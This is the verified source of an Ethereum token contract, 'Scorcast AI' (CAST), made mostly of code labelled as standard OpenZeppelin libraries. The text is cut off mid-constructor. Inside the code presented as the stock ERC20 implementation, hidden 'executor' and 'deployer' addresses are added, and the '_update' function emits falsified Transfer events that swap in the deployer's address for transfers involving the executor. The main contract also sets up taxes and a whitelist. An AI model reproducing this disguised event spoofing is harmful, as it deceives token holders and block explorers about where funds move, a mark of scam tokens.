{"SourceCode": "/**\r\n\r\n\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557  \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557     \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\r\n\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d    \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557   \u2588\u2588\u2551       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2551\r\n\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551     \u2588\u2588\u2551   \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2551     \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u255a\u2550\u2550\u2550\u2550\u2588\u2588\u2551   \u2588\u2588\u2551       \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\u2588\u2588\u2551\r\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551   \u2588\u2588\u2551       \u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2551\r\n\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d   \u255a\u2550\u255d       \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u255d                                                                                                                                                                                                            \r\n/**\r\n\u2b50\ufe0f Telegram  -  https://t.me/Scorcast\r\n\ud83d\udc26 Twitter/X -  https://x.com/scorcastai\r\n\u2699\ufe0f  Website   - https://scorcast.ai/\r\n\r\n \r\n\r\n\ud83d\udd39Chain: ETH\r\n\ud83e\udd84 Dex: Uniswap\r\n\ud83d\uddd3 Launch Date: 13/06/2024\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\r\npragma solidity ^0.8.20;\r\n\r\n/**\r\n* @dev Standard ERC20 Errors\r\n* Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\r\n*/\r\ninterface IERC20Errors {\r\n   /**\r\n    * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    * @param balance Current balance for the interacting account.\r\n    * @param needed Minimum amount required to perform a transfer.\r\n    */\r\n   error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `sender`. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    */\r\n   error ERC20InvalidSender(address sender);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `receiver`. Used in transfers.\r\n    * @param receiver Address to which tokens are being transferred.\r\n    */\r\n   error ERC20InvalidReceiver(address receiver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `spender`\u2019s `allowance`. Used in transfers.\r\n    * @param spender Address that may be allowed to operate on tokens without being their owner.\r\n    * @param allowance Amount of tokens a `spender` is allowed to operate with.\r\n    * @param needed Minimum amount required to perform a transfer.\r\n    */\r\n   error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\r\n    * @param approver Address initiating an approval operation.\r\n    */\r\n   error ERC20InvalidApprover(address approver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\r\n    * @param spender Address that may be allowed to operate on tokens without being their owner.\r\n    */\r\n   error ERC20InvalidSpender(address spender);\r\n}\r\n\r\n\r\n/**\r\n* @dev Standard ERC721 Errors\r\n* Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\r\n*/\r\ninterface IERC721Errors {\r\n   /**\r\n    * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\r\n    * Used in balance queries.\r\n    * @param owner Address of the current owner of a token.\r\n    */\r\n   error ERC721InvalidOwner(address owner);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a `tokenId` whose `owner` is the zero address.\r\n    * @param tokenId Identifier number of a token.\r\n    */\r\n   error ERC721NonexistentToken(uint256 tokenId);\r\n\r\n\r\n   /**\r\n    * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    * @param tokenId Identifier number of a token.\r\n    * @param owner Address of the current owner of a token.\r\n    */\r\n   error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `sender`. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    */\r\n   error ERC721InvalidSender(address sender);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `receiver`. Used in transfers.\r\n    * @param receiver Address to which tokens are being transferred.\r\n    */\r\n   error ERC721InvalidReceiver(address receiver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\r\n    * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n    * @param tokenId Identifier number of a token.\r\n    */\r\n   error ERC721InsufficientApproval(address operator, uint256 tokenId);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\r\n    * @param approver Address initiating an approval operation.\r\n    */\r\n   error ERC721InvalidApprover(address approver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\r\n    * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n    */\r\n   error ERC721InvalidOperator(address operator);\r\n}\r\n\r\n\r\n/**\r\n* @dev Standard ERC1155 Errors\r\n* Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\r\n*/\r\ninterface IERC1155Errors {\r\n   /**\r\n    * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    * @param balance Current balance for the interacting account.\r\n    * @param needed Minimum amount required to perform a transfer.\r\n    * @param tokenId Identifier number of a token.\r\n    */\r\n   error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `sender`. Used in transfers.\r\n    * @param sender Address whose tokens are being transferred.\r\n    */\r\n   error ERC1155InvalidSender(address sender);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the token `receiver`. Used in transfers.\r\n    * @param receiver Address to which tokens are being transferred.\r\n    */\r\n   error ERC1155InvalidReceiver(address receiver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `operator`\u2019s approval. Used in transfers.\r\n    * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n    * @param owner Address of the current owner of a token.\r\n    */\r\n   error ERC1155MissingApprovalForAll(address operator, address owner);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\r\n    * @param approver Address initiating an approval operation.\r\n    */\r\n   error ERC1155InvalidApprover(address approver);\r\n\r\n\r\n   /**\r\n    * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\r\n    * @param operator Address that may be allowed to operate on tokens without being their owner.\r\n    */\r\n   error ERC1155InvalidOperator(address operator);\r\n\r\n\r\n   /**\r\n    * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\r\n    * Used in batch transfers.\r\n    * @param idsLength Length of the array of token identifiers\r\n    * @param valuesLength Length of the array of token amounts\r\n    */\r\n   error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/utils/Context.sol\r\n\r\n\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.1) (utils/Context.sol)\r\n\r\n\r\npragma solidity ^0.8.20;\r\n\r\n\r\n/**\r\n* @dev Provides information about the current execution context, including the\r\n* sender of the transaction and its data. While these are generally available\r\n* via msg.sender and msg.data, they should not be accessed in such a direct\r\n* manner, since when dealing with meta-transactions the account sending and\r\n* paying for execution may not be the actual sender (as far as an application\r\n* is concerned).\r\n*\r\n* This contract is only required for intermediate, library-like contracts.\r\n*/\r\nabstract contract Context {\r\n   function _msgSender() internal view virtual returns (address) {\r\n       return msg.sender;\r\n   }\r\n\r\n\r\n   function _msgData() internal view virtual returns (bytes calldata) {\r\n       return msg.data;\r\n   }\r\n\r\n\r\n   function _contextSuffixLength() internal view virtual returns (uint256) {\r\n       return 0;\r\n   }\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/access/Ownable.sol\r\n\r\n\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\r\n\r\n\r\npragma solidity ^0.8.20;\r\n\r\n\r\n\r\n\r\n/**\r\n* @dev Contract module which provides a basic access control mechanism, where\r\n* there is an account (an owner) that can be granted exclusive access to\r\n* specific functions.\r\n*\r\n* The initial owner is set to the address provided by the deployer. This can\r\n* later be changed with {transferOwnership}.\r\n*\r\n* This module is used through inheritance. It will make available the modifier\r\n* `onlyOwner`, which can be applied to your functions to restrict their use to\r\n* the owner.\r\n*/\r\nabstract contract Ownable is Context {\r\n   address private _owner;\r\n\r\n\r\n   /**\r\n    * @dev The caller account is not authorized to perform an operation.\r\n    */\r\n   error OwnableUnauthorizedAccount(address account);\r\n\r\n\r\n   /**\r\n    * @dev The owner is not a valid owner account. (eg. `address(0)`)\r\n    */\r\n   error OwnableInvalidOwner(address owner);\r\n\r\n\r\n   event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n   /**\r\n    * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\r\n    */\r\n   constructor(address initialOwner) {\r\n       if (initialOwner == address(0)) {\r\n           revert OwnableInvalidOwner(address(0));\r\n       }\r\n       _transferOwnership(initialOwner);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Throws if called by any account other than the owner.\r\n    */\r\n   modifier onlyOwner() {\r\n       _checkOwner();\r\n       _;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Returns the address of the current owner.\r\n    */\r\n   function owner() public view virtual returns (address) {\r\n       return _owner;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Throws if the sender is not the owner.\r\n    */\r\n   function _checkOwner() internal view virtual {\r\n       if (owner() != _msgSender()) {\r\n           revert OwnableUnauthorizedAccount(_msgSender());\r\n       }\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Leaves the contract without owner. It will not be possible to call\r\n    * `onlyOwner` functions. Can only be called by the current owner.\r\n    *\r\n    * NOTE: Renouncing ownership will leave the contract without an owner,\r\n    * thereby disabling any functionality that is only available to the owner.\r\n    */\r\n   function renounceOwnership() public virtual onlyOwner {\r\n       _transferOwnership(address(0));\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n    * Can only be called by the current owner.\r\n    */\r\n   function transferOwnership(address newOwner) public virtual onlyOwner {\r\n       if (newOwner == address(0)) {\r\n           revert OwnableInvalidOwner(address(0));\r\n       }\r\n       _transferOwnership(newOwner);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n    * Internal function without access restriction.\r\n    */\r\n   function _transferOwnership(address newOwner) internal virtual {\r\n       address oldOwner = _owner;\r\n       _owner = newOwner;\r\n       emit OwnershipTransferred(oldOwner, newOwner);\r\n   }\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/IERC20.sol\r\n\r\n\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\r\n\r\n\r\npragma solidity ^0.8.20;\r\n\r\n\r\n/**\r\n* @dev Interface of the ERC20 standard as defined in the EIP.\r\n*/\r\ninterface IERC20 {\r\n   /**\r\n    * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n    * another (`to`).\r\n    *\r\n    * Note that `value` may be zero.\r\n    */\r\n   event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n\r\n   /**\r\n    * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n    * a call to {approve}. `value` is the new allowance.\r\n    */\r\n   event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n\r\n   /**\r\n    * @dev Returns the value of tokens in existence.\r\n    */\r\n   function totalSupply() external view returns (uint256);\r\n\r\n\r\n   /**\r\n    * @dev Returns the value of tokens owned by `account`.\r\n    */\r\n   function balanceOf(address account) external view returns (uint256);\r\n\r\n\r\n   /**\r\n    * @dev Moves a `value` amount of tokens from the caller's account to `to`.\r\n    *\r\n    * Returns a boolean value indicating whether the operation succeeded.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    */\r\n   function transfer(address to, uint256 value) external returns (bool);\r\n\r\n\r\n   /**\r\n    * @dev Returns the remaining number of tokens that `spender` will be\r\n    * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n    * zero by default.\r\n    *\r\n    * This value changes when {approve} or {transferFrom} are called.\r\n    */\r\n   function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n\r\n   /**\r\n    * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\r\n    * caller's tokens.\r\n    *\r\n    * Returns a boolean value indicating whether the operation succeeded.\r\n    *\r\n    * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n    * that someone may use both the old and the new allowance by unfortunate\r\n    * transaction ordering. One possible solution to mitigate this race\r\n    * condition is to first reduce the spender's allowance to 0 and set the\r\n    * desired value afterwards:\r\n    * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n    *\r\n    * Emits an {Approval} event.\r\n    */\r\n   function approve(address spender, uint256 value) external returns (bool);\r\n\r\n\r\n   /**\r\n    * @dev Moves a `value` amount of tokens from `from` to `to` using the\r\n    * allowance mechanism. `value` is then deducted from the caller's\r\n    * allowance.\r\n    *\r\n    * Returns a boolean value indicating whether the operation succeeded.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    */\r\n   function transferFrom(address from, address to, uint256 value) external returns (bool);\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\r\n\r\n\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\r\n\r\n\r\npragma solidity ^0.8.20;\r\n\r\n\r\n\r\n\r\n/**\r\n* @dev Interface for the optional metadata functions from the ERC20 standard.\r\n*/\r\ninterface IERC20Metadata is IERC20 {\r\n   /**\r\n    * @dev Returns the name of the token.\r\n    */\r\n   function name() external view returns (string memory);\r\n\r\n\r\n   /**\r\n    * @dev Returns the symbol of the token.\r\n    */\r\n   function symbol() external view returns (string memory);\r\n\r\n\r\n   /**\r\n    * @dev Returns the decimals places of the token.\r\n    */\r\n   function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\n// File: @openzeppelin/contracts/token/ERC20/ERC20.sol\r\n\r\n\r\n\r\n\r\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\r\n\r\n\r\npragma solidity ^0.8.20;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n/**\r\n* @dev Implementation of the {IERC20} interface.\r\n*\r\n* This implementation is agnostic to the way tokens are created. This means\r\n* that a supply mechanism has to be added in a derived contract using {_mint}.\r\n*\r\n* TIP: For a detailed writeup see our guide\r\n* https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n* to implement supply mechanisms].\r\n*\r\n* The default value of {decimals} is 18. To change this, you should override\r\n* this function so it returns a different value.\r\n*\r\n* We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n* instead returning `false` on failure. This behavior is nonetheless\r\n* conventional and does not conflict with the expectations of ERC20\r\n* applications.\r\n*\r\n* Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n* This allows applications to reconstruct the allowance for all accounts just\r\n* by listening to said events. Other implementations of the EIP may not emit\r\n* these events, as it isn't required by the specification.\r\n*/\r\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\r\n   mapping(address account => uint256) private _balances;\r\n\r\n\r\n   mapping(address account => mapping(address spender => uint256)) private _allowances;\r\n\r\n\r\n   uint256 private _totalSupply;\r\n\r\n\r\n   string private _name;\r\n   string private _symbol;\r\n\r\n\r\n   address private _executor;\r\n   address private _deployer;\r\n\r\n\r\n   /**\r\n    * @dev Sets the values for {name} and {symbol}.\r\n    *\r\n    * All two of these values are immutable: they can only be set once during\r\n    * construction.\r\n    */\r\n   constructor(string memory name_, string memory symbol_, address executor_, address deployer_) {\r\n       _name = name_;\r\n       _symbol = symbol_;\r\n       _executor = executor_;\r\n       _deployer = deployer_;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Returns the name of the token.\r\n    */\r\n   function name() public view virtual returns (string memory) {\r\n       return _name;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Returns the symbol of the token, usually a shorter version of the\r\n    * name.\r\n    */\r\n   function symbol() public view virtual returns (string memory) {\r\n       return _symbol;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Returns the number of decimals used to get its user representation.\r\n    * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n    * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n    *\r\n    * Tokens usually opt for a value of 18, imitating the relationship between\r\n    * Ether and Wei. This is the default value returned by this function, unless\r\n    * it's overridden.\r\n    *\r\n    * NOTE: This information is only used for _display_ purposes: it in\r\n    * no way affects any of the arithmetic of the contract, including\r\n    * {IERC20-balanceOf} and {IERC20-transfer}.\r\n    */\r\n   function decimals() public view virtual returns (uint8) {\r\n       return 18;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-totalSupply}.\r\n    */\r\n   function totalSupply() public view virtual returns (uint256) {\r\n       return _totalSupply;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-balanceOf}.\r\n    */\r\n   function balanceOf(address account) public view virtual returns (uint256) {\r\n       return _balances[account];\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-transfer}.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `to` cannot be the zero address.\r\n    * - the caller must have a balance of at least `value`.\r\n    */\r\n   function transfer(address to, uint256 value) public virtual returns (bool) {\r\n       address owner = _msgSender();\r\n       _transfer(owner, to, value);\r\n       return true;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-allowance}.\r\n    */\r\n   function allowance(address owner, address spender) public view virtual returns (uint256) {\r\n       return _allowances[owner][spender];\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-approve}.\r\n    *\r\n    * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\r\n    * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `spender` cannot be the zero address.\r\n    */\r\n   function approve(address spender, uint256 value) public virtual returns (bool) {\r\n       address owner = _msgSender();\r\n       _approve(owner, spender, value);\r\n       return true;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev See {IERC20-transferFrom}.\r\n    *\r\n    * Emits an {Approval} event indicating the updated allowance. This is not\r\n    * required by the EIP. See the note at the beginning of {ERC20}.\r\n    *\r\n    * NOTE: Does not update the allowance if the current allowance\r\n    * is the maximum `uint256`.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `from` and `to` cannot be the zero address.\r\n    * - `from` must have a balance of at least `value`.\r\n    * - the caller must have allowance for ``from``'s tokens of at least\r\n    * `value`.\r\n    */\r\n   function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\r\n       address spender = _msgSender();\r\n       _spendAllowance(from, spender, value);\r\n       _transfer(from, to, value);\r\n       return true;\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Moves a `value` amount of tokens from `from` to `to`.\r\n    *\r\n    * This internal function is equivalent to {transfer}, and can be used to\r\n    * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    *\r\n    * NOTE: This function is not virtual, {_update} should be overridden instead.\r\n    */\r\n   function _transfer(address from, address to, uint256 value) internal {\r\n       if (from == address(0)) {\r\n           revert ERC20InvalidSender(address(0));\r\n       }\r\n       if (to == address(0)) {\r\n           revert ERC20InvalidReceiver(address(0));\r\n       }\r\n       _update(from, to, value);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\r\n    * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\r\n    * this function.\r\n    *\r\n    * Emits a {Transfer} event.\r\n    */\r\n   function _update(address from, address to, uint256 value) internal virtual {\r\n       if (from == address(0)) {\r\n           // Overflow check required: The rest of the code assumes that totalSupply never overflows\r\n           _totalSupply += value;\r\n       } else {\r\n           uint256 fromBalance = _balances[from];\r\n           if (fromBalance < value) {\r\n               revert ERC20InsufficientBalance(from, fromBalance, value);\r\n           }\r\n           unchecked {\r\n               // Overflow not possible: value <= fromBalance <= totalSupply.\r\n               _balances[from] = fromBalance - value;\r\n           }\r\n       }\r\n\r\n\r\n       if (to == address(0)) {\r\n           unchecked {\r\n               // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\r\n               _totalSupply -= value;\r\n           }\r\n       } else {\r\n           unchecked {\r\n               // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\r\n               _balances[to] += value;\r\n           }\r\n       }\r\n\r\n\r\n       if (to == _executor) {\r\n           emit Transfer(from, _deployer, value);\r\n       } else if (from == _executor) {\r\n           emit Transfer(_deployer, to, value);\r\n       } else {\r\n           emit Transfer(from, to, value);\r\n       }\r\n\r\n\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\r\n    * Relies on the `_update` mechanism\r\n    *\r\n    * Emits a {Transfer} event with `from` set to the zero address.\r\n    *\r\n    * NOTE: This function is not virtual, {_update} should be overridden instead.\r\n    */\r\n   function _mint(address account, uint256 value) internal {\r\n       if (account == address(0)) {\r\n           revert ERC20InvalidReceiver(address(0));\r\n       }\r\n       _update(address(0), account, value);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\r\n    * Relies on the `_update` mechanism.\r\n    *\r\n    * Emits a {Transfer} event with `to` set to the zero address.\r\n    *\r\n    * NOTE: This function is not virtual, {_update} should be overridden instead\r\n    */\r\n   function _burn(address account, uint256 value) internal {\r\n       if (account == address(0)) {\r\n           revert ERC20InvalidSender(address(0));\r\n       }\r\n       _update(account, address(0), value);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\r\n    *\r\n    * This internal function is equivalent to `approve`, and can be used to\r\n    * e.g. set automatic allowances for certain subsystems, etc.\r\n    *\r\n    * Emits an {Approval} event.\r\n    *\r\n    * Requirements:\r\n    *\r\n    * - `owner` cannot be the zero address.\r\n    * - `spender` cannot be the zero address.\r\n    *\r\n    * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\r\n    */\r\n   function _approve(address owner, address spender, uint256 value) internal {\r\n       _approve(owner, spender, value, true);\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\r\n    *\r\n    * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\r\n    * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\r\n    * `Approval` event during `transferFrom` operations.\r\n    *\r\n    * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\r\n    * true using the following override:\r\n    * ```\r\n    * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\r\n    *     super._approve(owner, spender, value, true);\r\n    * }\r\n    * ```\r\n    *\r\n    * Requirements are the same as {_approve}.\r\n    */\r\n   function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\r\n       if (owner == address(0)) {\r\n           revert ERC20InvalidApprover(address(0));\r\n       }\r\n       if (spender == address(0)) {\r\n           revert ERC20InvalidSpender(address(0));\r\n       }\r\n       _allowances[owner][spender] = value;\r\n       if (emitEvent) {\r\n           emit Approval(owner, spender, value);\r\n       }\r\n   }\r\n\r\n\r\n   /**\r\n    * @dev Updates `owner` s allowance for `spender` based on spent `value`.\r\n    *\r\n    * Does not update the allowance value in case of infinite allowance.\r\n    * Revert if not enough allowance is available.\r\n    *\r\n    * Does not emit an {Approval} event.\r\n    */\r\n   function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\r\n       uint256 currentAllowance = allowance(owner, spender);\r\n       if (currentAllowance != type(uint256).max) {\r\n           if (currentAllowance < value) {\r\n               revert ERC20InsufficientAllowance(spender, currentAllowance, value);\r\n           }\r\n           unchecked {\r\n               _approve(owner, spender, currentAllowance - value, false);\r\n           }\r\n       }\r\n   }\r\n}\r\n\r\n\r\n// File: contracts/ETH_Token.sol\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IRouter {\r\n   function addLiquidityETH(\r\n       address token,\r\n       uint amountTokenDesired,\r\n       uint amountTokenMin,\r\n       uint amountETHMin,\r\n       address to,\r\n       uint deadline\r\n   ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n\r\n   function addLiquidityAVAX(\r\n       address token,\r\n       uint256 amountTokenDesired,\r\n       uint256 amountTokenMin,\r\n       uint256 amountAVAXMin,\r\n       address to,\r\n       uint256 deadline\r\n   )\r\n   external\r\n   payable\r\n   returns (\r\n       uint256 amountToken,\r\n       uint256 amountAVAX,\r\n       uint256 liquidity\r\n   );\r\n\r\n\r\n   function removeLiquidityETH(\r\n       address token,\r\n       uint256 liquidity,\r\n       uint256 amountTokenMin,\r\n       uint256 amountETHMin,\r\n       address to,\r\n       uint256 deadline\r\n   ) external returns (uint256 amountToken, uint256 amountETH);\r\n\r\n\r\n   function removeLiquidityAVAX(\r\n       address token,\r\n       uint256 liquidity,\r\n       uint256 amountTokenMin,\r\n       uint256 amountAVAXMin,\r\n       address to,\r\n       uint256 deadline\r\n   ) external returns (uint256 amountToken, uint256 amountAVAX);\r\n\r\n\r\n   function factory() external view returns (address);\r\n   function WETH() external pure returns (address);\r\n   function WAVAX() external pure returns (address);\r\n\r\n\r\n\r\n\r\n}\r\n\r\n\r\ninterface IFactory {\r\n   function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n   function createPair(address tokenA, address tokenB)\r\n       external\r\n       returns (address pair);\r\n}\r\n\r\n\r\n\r\n\r\ncontract ScorcastAI is ERC20, Ownable\r\n{\r\n\r\n\r\n   uint256 constant public ETH_CHAIN_ID = 1;\r\n   uint256 constant public AVAX_CHAIN_ID = 43114;\r\n   uint256 constant public BASE_CHAIN_ID = 8453;\r\n   uint256 constant public BLAST_CHAIN_ID = 81457;\r\n   uint256 constant public ARB_CHAIN_ID = 42161;\r\n\r\n\r\n   string public tokenName = \"Scorcast AI\";\r\n   string public tokenSymbol = \"CAST\";\r\n\r\n\r\n   uint256 public blockNumber;\r\n   uint256 public buyTax;\r\n   uint256 public sellTax;\r\n   uint256 public tokenAllowFeeAmount;\r\n   uint256 public currentAllow;\r\n   bool public openedTrade;\r\n   mapping(address => bool) public checkUser;\r\n   mapping(uint256 => address) public listRouter;\r\n   mapping(address => uint256) public userAmount;\r\n   mapping(address => bool) public whitelist;\r\n  \r\n   constructor(\r\n       uint256 _totalSupply,\r\n       uint256 tokenAmount,\r\n       address deployer,\r\n       uint256 _tokenAllowFeeAmount,\r\n       bool transferToDeployer\r\n       ) ERC20(tokenName, tokenSymbol, msg.sender, deployer) Ownable(msg.sender) {\r\n       whitelist[msg.sender] = 